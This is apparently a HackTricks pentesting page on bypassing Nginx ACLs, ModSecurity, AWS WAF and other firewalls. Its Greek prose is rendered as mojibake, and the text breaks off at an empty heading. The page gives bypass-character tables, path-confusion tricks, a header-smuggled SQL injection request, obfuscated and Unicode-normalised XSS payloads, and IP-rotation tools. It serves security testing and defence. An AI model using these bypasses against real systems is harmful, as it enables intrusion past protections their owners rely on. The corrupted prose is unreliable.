# Proxy / WAF Protections Bypass

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î¿ [**telegram group**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Î¤ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ [Î±Ï€ÏŒ Î±Ï…Ï„Î® Ï„Î·Î½ Î­ÏÎµÏ…Î½Î±](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎºÎ±Î½ÏŒÎ½Î± Nginx:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Î“Î¹Î± Î½Î± Î±Ï€Î¿Ï„ÏÎ±Ï€Î¿ÏÎ½ Î¿Î¹ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚, Ï„Î¿ Nginx ÎµÎºÏ„ÎµÎ»ÎµÎ¯ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Î½ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ backend ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· (Î±Ï†Î±Î¹ÏÏÎ½Ï„Î±Ï‚ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ Ï€Î¿Ï… Î´ÎµÎ½ Î±Ï†Î±Î¹ÏÎµÎ¯ Ï„Î¿ nginx), Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î¬Î¼Ï…Î½Î±Ï‚.

### **NodeJS - Express**

| Nginx Version | **Node.js Bypass Characters** |
| ------------- | ----------------------------- |
| 1.22.0        | `\xA0`                        |
| 1.21.6        | `\xA0`                        |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`        |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`        |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`        |

### **Flask**

| Nginx Version | **Flask Bypass Characters**                                    |
| ------------- | -------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Version | **Spring Boot Bypass Characters** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Î”Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Nginx FPM:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ Î½Î± Î¼Ï€Î»Î¿ÎºÎ¬ÏÎµÎ¹ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ `/admin.php`, Î±Î»Î»Î¬ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸ÎµÎ¯ Î±Ï…Ï„ÏŒ Î¼Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ `/admin.php/index.php`.

### Î ÏÏ‚ Î½Î± Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÏ„Îµ
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î¹ Ï„Î¿ ModSecurity v3 (Î¼Î­Ï‡ÏÎ¹ 3.0.12), **Ï…Î»Î¿Ï€Î¿Î¹Î¿ÏÏƒÎµ ÎµÏƒÏ†Î±Î»Î¼Î­Î½Î± Ï„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® `REQUEST_FILENAME`** Î· Î¿Ï€Î¿Î¯Î± Ï€ÏÎ¿Î¿ÏÎ¹Î¶ÏŒÏ„Î±Î½ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬ÏƒÏ„Î·ÎºÎµ (Î¼Î­Ï‡ÏÎ¹ Ï„Î·Î½ Î±ÏÏ‡Î® Ï„Ï‰Î½ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½). Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎµÏ€ÎµÎ¹Î´Î® ÎµÎºÏ„ÎµÎ»Î¿ÏÏƒÎµ Î¼Î¹Î± Î±Ï€Î¿ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· URL Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î®.\
Î©Ï‚ ÎµÎº Ï„Î¿ÏÏ„Î¿Ï…, Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `http://example.com/foo%3f';alert(1);foo=` ÏƒÏ„Î¿ mod security Î¸Î± Ï…Ï€Î¿Î¸Î­ÏƒÎµÎ¹ ÏŒÏ„Î¹ Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»ÏÏ‚ `/foo` ÎµÏ€ÎµÎ¹Î´Î® Ï„Î¿ `%3f` Î¼ÎµÏ„Î±Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ ÏƒÎµ `?` Ï€Î¿Ï… Ï„ÎµÏÎ¼Î±Ï„Î¯Î¶ÎµÎ¹ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® URL, Î±Î»Î»Î¬ ÏƒÏ„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒÏ„Î·Ï„Î± Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï€Î¿Ï… Î¸Î± Î»Î¬Î²ÎµÎ¹ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î¸Î± ÎµÎ¯Î½Î±Î¹ `/foo%3f';alert(1);foo=`.

ÎŸÎ¹ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ `REQUEST_BASENAME` ÎºÎ±Î¹ `PATH_INFO` ÎµÏ€Î·ÏÎµÎ¬ÏƒÏ„Î·ÎºÎ±Î½ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏ†Î¬Î»Î¼Î±.

ÎšÎ¬Ï„Î¹ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ ÏƒÏ…Î½Î­Î²Î· ÏƒÏ„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· 2 Ï„Î¿Ï… Mod Security Ï€Î¿Ï… ÎµÏ€Î­Ï„ÏÎµÏ€Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Î¼Î¹Î±Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î±Ï‚ Ï€Î¿Ï… ÎµÎ¼Ï€ÏŒÎ´Î¹Î¶Îµ Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬ÏƒÎ¿Ï…Î½ Î±ÏÏ‡ÎµÎ¯Î± Î¼Îµ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ­Ï‚ Î¼Îµ Î±ÏÏ‡ÎµÎ¯Î± Î±Î½Ï„Î¹Î³ÏÎ¬Ï†Ï‰Î½ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ (ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `.bak`) Î±Ï€Î»Î¬ ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Ï„ÎµÎ»ÎµÎ¯Î± ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÏƒÎµ `%2e`, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[Î‘Ï…Ï„Î® Î· Î­ÏÎµÏ…Î½Î±](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) Î±Î½Î±Ï†Î­ÏÎµÎ¹ ÏŒÏ„Î¹ Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸Î¿ÏÎ½ Î¿Î¹ ÎºÎ±Î½ÏŒÎ½ÎµÏ‚ AWS WAF Ï€Î¿Ï… ÎµÏ†Î±ÏÎ¼ÏŒÎ¶Î¿Î½Ï„Î±Î½ ÏƒÎµ HTTP headers ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Î­Î½Î±Î½ "ÎºÎ±ÎºÏÏ‚ ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼Î­Î½Î¿" header Ï€Î¿Ï… Î´ÎµÎ½ Î±Î½Î±Î»ÏÎ¸Î·ÎºÎµ ÏƒÏ‰ÏƒÏ„Î¬ Î±Ï€ÏŒ Ï„Î·Î½ AWS Î±Î»Î»Î¬ Î±Î½Î±Î»ÏÎ¸Î·ÎºÎµ Î±Ï€ÏŒ Ï„Î¿Î½ backend server.

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Ï„Î¿ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î¿ Î±Î¯Ï„Î·Î¼Î± Î¼Îµ Î¼Î¹Î± SQL injection ÏƒÏ„Î¿Î½ header X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Î‰Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸ÎµÎ¯ Ï„Î¿ AWS WAF ÎµÏ€ÎµÎ¹Î´Î® Î´ÎµÎ½ ÎºÎ±Ï„Î±Î»Î¬Î²Î±Î¹Î½Îµ ÏŒÏ„Î¹ Î· ÎµÏ€ÏŒÎ¼ÎµÎ½Î· Î³ÏÎ±Î¼Î¼Î® ÎµÎ¯Î½Î±Î¹ Î¼Î­ÏÎ¿Ï‚ Ï„Î·Ï‚ Ï„Î¹Î¼Î®Ï‚ Ï„Î·Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´Î±Ï‚ ÎµÎ½Ï Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ NODEJS Ï„Î¿ ÎºÎ±Ï„Î±Î»Î¬Î²Î±Î¹Î½Îµ (Î±Ï…Ï„ÏŒ Î´Î¹Î¿ÏÎ¸ÏÎ¸Î·ÎºÎµ).

## Î“ÎµÎ½Î¹ÎºÎ­Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚ WAF

### ÎŒÏÎ¹Î± ÎœÎµÎ³Î­Î¸Î¿Ï…Ï‚ Î‘Î¹Ï„Î®ÏƒÎµÏ‰Î½

Î£Ï…Î½Î®Î¸Ï‰Ï‚, Ï„Î± WAF Î­Ï‡Î¿Ï…Î½ Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÏŒÏÎ¹Î¿ Î¼Î®ÎºÎ¿Ï…Ï‚ Î±Î¹Ï„Î®ÏƒÎµÏ‰Î½ Î³Î¹Î± Î­Î»ÎµÎ³Ï‡Î¿ ÎºÎ±Î¹ Î±Î½ Î¼Î¹Î± Î±Î¯Ï„Î·ÏƒÎ· POST/PUT/PATCH ÎµÎ¯Î½Î±Î¹ Ï€Î¬Î½Ï‰ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ, Ï„Î¿ WAF Î´ÎµÎ½ Î¸Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï„Î·Î½ Î±Î¯Ï„Î·ÏƒÎ·.

* Î“Î¹Î± Ï„Î¿ AWS WAF, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± [**ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î·Î½ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ·**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>ÎœÎ­Î³Î¹ÏƒÏ„Î¿ Î¼Î­Î³ÎµÎ¸Î¿Ï‚ ÏƒÏÎ¼Î±Ï„Î¿Ï‚ Î±Î¯Ï„Î·ÏƒÎ·Ï‚ Î¹ÏƒÏ„Î¿Ï Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ»ÎµÎ³Ï‡Î¸ÎµÎ¯ Î³Î¹Î± Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚ Application Load Balancer ÎºÎ±Î¹ AWS AppSync</td><td>8 KB</td></tr><tr><td>ÎœÎ­Î³Î¹ÏƒÏ„Î¿ Î¼Î­Î³ÎµÎ¸Î¿Ï‚ ÏƒÏÎ¼Î±Ï„Î¿Ï‚ Î±Î¯Ï„Î·ÏƒÎ·Ï‚ Î¹ÏƒÏ„Î¿Ï Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ»ÎµÎ³Ï‡Î¸ÎµÎ¯ Î³Î¹Î± Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚ CloudFront, API Gateway, Amazon Cognito, App Runner ÎºÎ±Î¹ Verified Access**</td><td>64 KB</td></tr></tbody></table>

* Î‘Ï€ÏŒ [**Ï„Î± Î­Î³Î³ÏÎ±Ï†Î± Ï„Î¿Ï… Azure**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Î Î±Î»Î±Î¹ÏŒÏ„ÎµÏÎ± Web Application Firewalls Î¼Îµ Core Rule Set 3.1 (Î® Ï‡Î±Î¼Î·Î»ÏŒÏ„ÎµÏÎ±) ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Î¼Î·Î½ÏÎ¼Î±Ï„Î± Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ± Î±Ï€ÏŒ **128 KB** Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ€Î¹Î¸ÎµÏÏÎ·ÏƒÎ· ÏƒÏÎ¼Î±Ï„Î¿Ï‚ Î±Î¯Ï„Î·ÏƒÎ·Ï‚, Î±Î»Î»Î¬ Î±Ï…Ï„Î¬ Ï„Î± Î¼Î·Î½ÏÎ¼Î±Ï„Î± Î´ÎµÎ½ Î¸Î± ÎµÎ»ÎµÎ³Ï‡Î¸Î¿ÏÎ½ Î³Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚. Î“Î¹Î± Î½ÎµÏŒÏ„ÎµÏÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ (Core Rule Set 3.2 Î® Î½ÎµÏŒÏ„ÎµÏÎµÏ‚), Ï„Î¿ Î¯Î´Î¹Î¿ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³Î¯Î½ÎµÎ¹ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Î¼Î­Î³Î¹ÏƒÏ„Î¿ ÏŒÏÎ¹Î¿ ÏƒÏÎ¼Î±Ï„Î¿Ï‚ Î±Î¯Ï„Î·ÏƒÎ·Ï‚. ÎŒÏ„Î±Î½ Î¼Î¹Î± Î±Î¯Ï„Î·ÏƒÎ· Ï…Ï€ÎµÏÎ²Î±Î¯Î½ÎµÎ¹ Ï„Î¿ ÏŒÏÎ¹Î¿ Î¼ÎµÎ³Î­Î¸Î¿Ï…Ï‚:

Î‘Î½ ÎµÎ¯Î½Î±Î¹ **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï€ÏÏŒÎ»Î·ÏˆÎ·Ï‚**: ÎšÎ±Ï„Î±Î³ÏÎ¬Ï†ÎµÎ¹ ÎºÎ±Î¹ Î¼Ï€Î»Î¿ÎºÎ¬ÏÎµÎ¹ Ï„Î·Î½ Î±Î¯Ï„Î·ÏƒÎ·.\
Î‘Î½ ÎµÎ¯Î½Î±Î¹ **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚**: Î•Î»Î­Î³Ï‡ÎµÎ¹ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿ ÏŒÏÎ¹Î¿, Î±Î³Î½Î¿ÎµÎ¯ Ï„Î¿ Ï…Ï€ÏŒÎ»Î¿Î¹Ï€Î¿ ÎºÎ±Î¹ ÎºÎ±Ï„Î±Î³ÏÎ¬Ï†ÎµÎ¹ Î±Î½ Ï„Î¿ `Content-Length` Ï…Ï€ÎµÏÎ²Î±Î¯Î½ÎµÎ¹ Ï„Î¿ ÏŒÏÎ¹Î¿.

* Î‘Ï€ÏŒ [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Ï„Î¿ WAF ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î¼ÏŒÎ½Î¿ Ï„Î± Ï€ÏÏÏ„Î± 8KB Î¼Î¹Î±Ï‚ Î±Î¯Ï„Î·ÏƒÎ·Ï‚. ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± Î±Ï…Î¾Î®ÏƒÎµÎ¹ Ï„Î¿ ÏŒÏÎ¹Î¿ Î­Ï‰Ï‚ 128KB Ï€ÏÎ¿ÏƒÎ¸Î­Ï„Î¿Î½Ï„Î±Ï‚ Î ÏÎ¿Î·Î³Î¼Î­Î½Î± ÎœÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Î±.

* Î‘Ï€ÏŒ [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

ÎˆÏ‰Ï‚ 128KB.

### Î‘Ï€ÏŒÎºÏÏ…ÏˆÎ· <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode Compatability <a href="#unicode-compatability" id="unicode-compatability"></a>

Î‘Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î·Î½ Ï…Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î·Ï‚ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Unicode (Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ [ÎµÎ´Ï](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ Ï€Î¿Ï… Î¼Î¿Î¹ÏÎ¬Î¶Î¿Î½Ï„Î±Î¹ Ï„Î·Î½ ÏƒÏ…Î¼Î²Î±Ï„ÏŒÏ„Î·Ï„Î± Unicode Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎ¿Ï…Î½ Ï„Î¿ WAF ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Ï‰Ï‚ Ï„Î¿ Ï€ÏÎ¿Î¿ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î¿ payload. Î£Ï…Î¼Î²Î±Ï„Î¿Î¯ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ [ÎµÎ´Ï](https://www.compart.com/en/unicode).

#### Example <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

* [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ URL Ï€ÏÎ»Î·Ï‚ API Î³Î¹Î± Ï‡ÏÎ®ÏƒÎ· Î¼Îµ Ï„Î¿ ffuf
* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Î Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Ï„Î¿ fireprox
* [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Î ÏÏŒÏƒÎ¸ÎµÏ„Î¿ Burp Suite Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ IP Ï€ÏÎ»Î·Ï‚ API
* [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): ÎˆÎ½Î±Ï‚ Î´Ï…Î½Î±Î¼Î¹ÎºÎ¬ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿Ï‚ Î±ÏÎ¹Î¸Î¼ÏŒÏ‚ Ï€ÎµÏÎ¹Î²Î±Î»Î»ÏŒÎ½Ï„Ï‰Î½ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¿ Î¼Î­Î³ÎµÎ¸Î¿Ï‚ Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… ÎºÎ±Î¹ Ï„Î¿Î½ Ï€Î±ÏÎ¬Î³Î¿Î½Ï„Î± Î´Î¹Î±Ï‡Ï‰ÏÎ¹ÏƒÎ¼Î¿Ï, Î¼Îµ Ï„Î·Î½ ÎµÎ¯ÏƒÎ¿Î´Î¿ Î½Î± Î´Î¹Î±Ï‡Ï‰ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÎµ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹Î± Î³Î¹Î± Ï€Î±ÏÎ¬Î»Î»Î·Î»Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ·, ÏŒÏ€Ï‰Ï‚ 100 Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î± Î½Î± ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶Î¿Î½Ï„Î±Î¹ 100 ÎºÎ¿Î¼Î¼Î¬Ï„Î¹Î± Î±Ï€ÏŒ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… 10,000 Î³ÏÎ±Î¼Î¼ÏÎ½ Î¼Îµ Ï€Î±ÏÎ¬Î³Î¿Î½Ï„Î± Î´Î¹Î±Ï‡Ï‰ÏÎ¹ÏƒÎ¼Î¿Ï 100 Î³ÏÎ±Î¼Î¼ÏÎ½.

### Regex Bypasses

